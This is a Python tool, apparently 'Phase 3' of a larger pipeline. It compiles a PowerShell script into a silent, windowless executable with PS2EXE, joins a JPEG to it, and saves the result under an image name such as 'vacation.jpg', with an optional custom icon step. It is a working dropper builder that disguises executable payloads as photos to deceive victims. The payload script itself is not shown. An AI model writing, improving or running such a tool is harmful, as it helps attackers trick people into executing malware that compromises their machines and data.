"""
Phase 3: Create Polyglot - Combine EXE + JPEG into single .jpg file
Input: PowerShell script + original image
Output: vacation.jpg (valid EXE + valid JPEG)
"""

import os
import subprocess
import argparse
import struct
import sys
from pathlib import Path


class PolyglotCreator:
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.ps2exe_path = None
    
    def log(self, message):
        if self.verbose:
            print(f"[POLYGLOT] {message}")
    
    def create(self, ps_script_path, image_path, output_path):
        """
        Create polyglot file (EXE + JPEG)
        
        Steps:
        1. Compile PowerShell script to EXE using PS2EXE
        2. Append JPEG binary to EXE
        3. Result is both valid EXE and valid JPEG
        
        Args:
            ps_script_path: Path to PowerShell script
            image_path: Path to original image (JPEG)
            output_path: Path to save polyglot (should be .jpg)
        
        Returns:
            bool: Success status
        """
        temp_exe = output_path.replace('.jpg', '_temp.exe')
        
        try:
            # Step 1: Compile PowerShell to EXE
            self.log("Step 1: Compiling PowerShell script to EXE...")
            if not self._compile_ps_to_exe(ps_script_path, temp_exe):
                self.log("[-] Failed to compile PowerShell script")
                return False
            
            # Step 2: Verify EXE was created
            if not os.path.exists(temp_exe):
                self.log(f"[-] Compiled EXE not found: {temp_exe}")
                return False
            
            exe_size = os.path.getsize(temp_exe)
            self.log(f"[+] EXE created successfully! Size: {exe_size} bytes")
            
            # Step 3: Create polyglot
            self.log("Step 2: Creating polyglot file...")
            if not self._create_polyglot_file(temp_exe, image_path, output_path):
                self.log("[-] Failed to create polyglot")
                return False
            
            # Step 4: Verify polyglot
            self.log("Step 3: Verifying polyglot...")
            if self._verify_polyglot(output_path):
                self.log("[+] Polyglot created successfully!")
                self.log(f"[+] Output: {output_path}")
                self.log(f"[+] File size: {os.path.getsize(output_path)} bytes")
                return True
            else:
                self.log("[-] Polyglot verification failed")
                return False
        
        except Exception as e:
            self.log(f"[-] Error: {e}")
            return False
        
        finally:
            # Cleanup temp EXE
            if os.path.exists(temp_exe):
                os.remove(temp_exe)
                self.log("[*] Cleaned up temporary files")
    
    def _compile_ps_to_exe(self, ps_script_path, exe_path):
        """
        Compile PowerShell script to EXE using PS2EXE
        
        Requires: Install-Module PS2EXE -Force
        """
        self.log(f"Loading PowerShell script: {ps_script_path}")
        
        # PowerShell command to compile using ps2exe
        ps_command = f'''
$ProgressPreference = "SilentlyContinue"
Import-Module PS2EXE -ErrorAction SilentlyContinue
if (-not (Get-Module PS2EXE)) {{
    Write-Host "[-] PS2EXE module not found. Installing..."
    Install-Module PS2EXE -Force -Scope CurrentUser
}}

ps2exe -InputFile "{ps_script_path}" `
       -OutputFile "{exe_path}" `
       -NoConsole `
       -NoOutput `
       -x64 `
       -ErrorAction Stop

if (Test-Path "{exe_path}") {{
    Write-Host "[+] Compilation successful!"
    exit 0
}} else {{
    Write-Host "[-] Compilation failed!"
    exit 1
}}
'''
        
        try:
            self.log("Executing PS2EXE compilation...")
            result = subprocess.run(
                ['powershell.exe', '-Command', ps_command],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                self.log("[+] PS2EXE compilation successful")
                return True
            else:
                self.log(f"[-] PS2EXE failed: {result.stderr}")
                return False
        
        except subprocess.TimeoutExpired:
            self.log("[-] PS2EXE compilation timed out")
            return False
        except Exception as e:
            self.log(f"[-] Failed to execute PS2EXE: {e}")
            return False
    
    def _create_polyglot_file(self, exe_path, image_path, output_path):
        """
        Create polyglot by appending JPEG to EXE binary
        
        Structure:
        [EXE binary - Windows executes until section table end]
        [JPEG binary - JPEG reader ignores everything before 0xFFD9]
        [JPEG EOI marker - 0xFFD9]
        """
        try:
            self.log(f"Reading EXE: {exe_path}")
            with open(exe_path, 'rb') as f:
                exe_data = f.read()
            
            self.log(f"Reading image: {image_path}")
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            # Verify JPEG format
            if not (image_data[:2] == b'\xFF\xD8' and b'\xFF\xD9' in image_data):
                self.log("[-] Image doesn't appear to be a valid JPEG")
                # Continue anyway, might still work
            
            # Create polyglot: EXE + JPEG
            polyglot_data = exe_data + image_data
            
            self.log(f"Writing polyglot to: {output_path}")
            with open(output_path, 'wb') as f:
                f.write(polyglot_data)
            
            self.log(f"[+] Polyglot created! Size: {len(polyglot_data)} bytes")
            return True
        
        except Exception as e:
            self.log(f"[-] Failed to create polyglot: {e}")
            return False
    
    def _verify_polyglot(self, polyglot_path):
        """
        Verify that polyglot is both valid EXE and valid JPEG
        """
        try:
            with open(polyglot_path, 'rb') as f:
                data = f.read()
            
            # Check EXE header (MZ = 0x4D5A)
            if data[:2] != b'MZ':
                self.log("[-] File doesn't start with MZ (EXE magic)")
                return False
            self.log("[+] Valid EXE header found (MZ)")
            
            # Check JPEG markers (FFD8 = SOI, FFD9 = EOI)
            if b'\xFF\xD9' not in data:
                self.log("[-] No JPEG EOI marker (0xFFD9) found")
                return False
            self.log("[+] Valid JPEG end marker found (0xFFD9)")
            
            # Both formats verified
            self.log("[+] File is valid polyglot (EXE + JPEG)")
            return True
        
        except Exception as e:
            self.log(f"[-] Verification error: {e}")
            return False
    
    def create_with_icon(self, ps_script_path, image_path, output_path, icon_path=None):
        """
        Create polyglot with optional custom icon
        
        Note: Icon change should be done after polyglot creation
        """
        success = self.create(ps_script_path, image_path, output_path)
        
        if success and icon_path:
            self.log("Setting custom icon...")
            if self._set_file_icon(output_path, icon_path):
                self.log("[+] Icon set successfully")
            else:
                self.log("[*] Icon setting skipped/failed")
        
        return success
    
    def _set_file_icon(self, exe_path, icon_path):
        """
        Set custom icon for file (Windows only)
        This is a complex operation, simplified here
        """
        # This would require Win32 API or external tool
        # For now, manual instruction is sufficient
        self.log(f"[*] To set custom icon:")
        self.log(f"    1. Right-click {exe_path}")
        self.log(f"    2. Properties → Change Icon")
        self.log(f"    3. Browse to {icon_path}")
        return False


def main():
    parser = argparse.ArgumentParser(description='Create polyglot file (EXE + JPEG)')
    parser.add_argument('--script', required=True, help='Path to PowerShell script')
    parser.add_argument('--image', required=True, help='Path to image (JPEG)')
    parser.add_argument('--output', required=True, help='Output path for polyglot (.jpg file)')
    parser.add_argument('--icon', help='Optional path to icon file (.ico)')
    
    args = parser.parse_args()
    
    # Verify inputs
    if not os.path.exists(args.script):
        print(f"Error: Script not found: {args.script}")
        sys.exit(1)
    
    if not os.path.exists(args.image):
        print(f"Error: Image not found: {args.image}")
        sys.exit(1)
    
    creator = PolyglotCreator()
    
    if args.icon:
        success = creator.create_with_icon(args.script, args.image, args.output, args.icon)
    else:
        success = creator.create(args.script, args.image, args.output)
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
